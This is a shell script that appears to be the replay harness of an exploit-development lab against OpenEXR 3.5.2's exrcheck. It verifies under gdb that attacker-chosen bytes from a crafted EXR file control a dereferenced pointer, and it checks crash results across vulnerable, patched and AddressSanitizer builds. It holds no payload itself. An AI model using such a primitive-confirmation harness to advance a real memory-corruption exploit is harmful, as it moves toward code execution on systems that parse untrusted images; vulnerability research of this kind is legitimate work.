#!/bin/sh
# W195: one-command replay.  In the UNMODIFIED pinned 3.5.2 exrcheck -c,
# with ASLR explicitly ON, eight file-chosen bytes land in the pointer that
# exr_attr_list_destroy() actually dereferences at attributes.c:305.  The
# faulting instruction's r13 equals the chosen value in the SAME run.
# This is rung-4 pinned attribution, NOT rung 5: no chosen IP, no command,
# no wire, no witness verdict.
set -eu
cd "$(CDPATH= cd -- "$(dirname -- "$0")/.." && pwd)"
mkdir -p evidence

for spec in \
    'cases/w195-pre-copy2-dump.bin f7c32f6ad820de0532396426d0ad9a8aa58440071636b03e1592cf766daffdc0' \
    'harness/w195-deref.cmd 36b7d07d85202e483c8449eb6bc87c1ecac0e112d7e1911282305e6bca4f354e' \
    'cases/p195-chosen-deref.exr 99340367a4e3c12afc8b01821d07c81f404f90d2964315a18680211999428216'
do
    set -- $spec
    test "$(sha256sum "$1" | cut -d' ' -f1)" = "$2"
done

RAW=$(mktemp)
trap 'rm -f "$RAW"' EXIT
gdb -q -batch \
    -ex 'set args -c cases/p195-chosen-deref.exr' \
    -x harness/w195-deref.cmd \
    ./build-vuln-plain/bin/exrcheck > "$RAW" 2>&1 || true
grep -q '^Disabling randomization of debuggee.s virtual address space is off\.$' "$RAW"
grep -q '^SLOT0_DELTA=4176$' "$RAW"
grep -q 'REAL_LIST=.*SLOT0=0x4141414141414141 I=0 NUM=11' "$RAW"
grep -q '^FAULT_R13=0x4141414141414141' "$RAW"
grep -q 'mov    0x14(%r13),%eax' "$RAW"

{
    echo 'ASLR=on'
    grep -o 'SLOT0_DELTA=4176' "$RAW"
    grep -o 'SLOT0=0x4141414141414141 I=0 NUM=11' "$RAW"
    grep -o 'FAULT_R13=0x[0-9a-f]*' "$RAW"
    grep -o 'mov    0x14(%r13),%eax' "$RAW"
} > evidence/w195-deref.out

set +e
./build-vuln-plain/bin/exrcheck -c cases/p195-chosen-deref.exr \
    > evidence/w195-plain.out 2>&1
plain_rc=$?
./build-vuln-plain/bin/exrcheck -c cases/baseline.exr \
    > evidence/w195-valid.out 2>&1
valid_rc=$?
./build-fixed-plain/bin/exrcheck -c cases/p195-chosen-deref.exr \
    > evidence/w195-fixed.out 2>&1
fixed_rc=$?
ASAN_OPTIONS=detect_leaks=0:abort_on_error=0:log_path=stderr \
    ./build-vuln-asan/bin/exrcheck -c cases/p195-chosen-deref.exr \
    > "$RAW" 2>&1
asan_rc=$?
set -e
[ "$plain_rc" -eq 139 ]
[ "$valid_rc" -eq 0 ]
[ "$fixed_rc" -eq 1 ]
[ "$asan_rc" -eq 1 ]
grep -q 'OK' evidence/w195-valid.out
grep -q 'bad' evidence/w195-fixed.out

awk '
    { gsub(/==[0-9]+==/, "==PID==") }
    { gsub(/BuildId: [0-9a-f]+/, "BuildId: ID") }
    { gsub(/\/home\/mesh-home\/mishe-tauftauf2shell\/lab\/openexr2shell-real/, "LAB") }
    { gsub(/\/home\/mesh-home\/mishe-tauftauf2shell/, "SITE") }
    { gsub(/0x[0-9a-f][0-9a-f][0-9a-f][0-9a-f][0-9a-f][0-9a-f][0-9a-f]*/, "ADDR") }
    { print }
' < "$RAW" > evidence/w195-asan.out
grep -q 'ERROR: AddressSanitizer: heap-buffer-overflow' evidence/w195-asan.out
grep -q 'READ of size 3072' evidence/w195-asan.out
grep -q 'internal_zstd.c:472' evidence/w195-asan.out

printf 'RESULT PASS\n'
sha256sum evidence/w195-*.out
